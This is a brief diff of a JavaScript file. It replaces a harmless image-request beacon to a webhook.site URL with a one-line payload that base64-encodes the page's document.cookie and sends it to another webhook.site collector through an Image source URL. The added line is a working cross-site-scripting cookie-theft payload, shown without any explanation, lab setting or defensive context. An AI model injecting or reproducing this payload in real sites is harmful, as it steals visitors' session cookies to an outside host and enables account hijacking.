@@ -1,12 +1,1 @@
-(function() {
-    // Function to send a request
-    function sendRequest() {
-        var image = new Image(); // Create a new Image object to send a request
-
-        // Send a request to your server (replace with your own endpoint)
-        image.src = 'http://webhook.site/9e44ad17-69df-4432-84e5-1f7c11ab05be';
-    }
-
-    // Call the function to send the request
-    sendRequest();
-})();
+x = new Image(); x.src = 'https://webhook.site/925ffae1-fe20-4e4f-ba37-4016c8fe7727?data='+btoa(document.cookie);
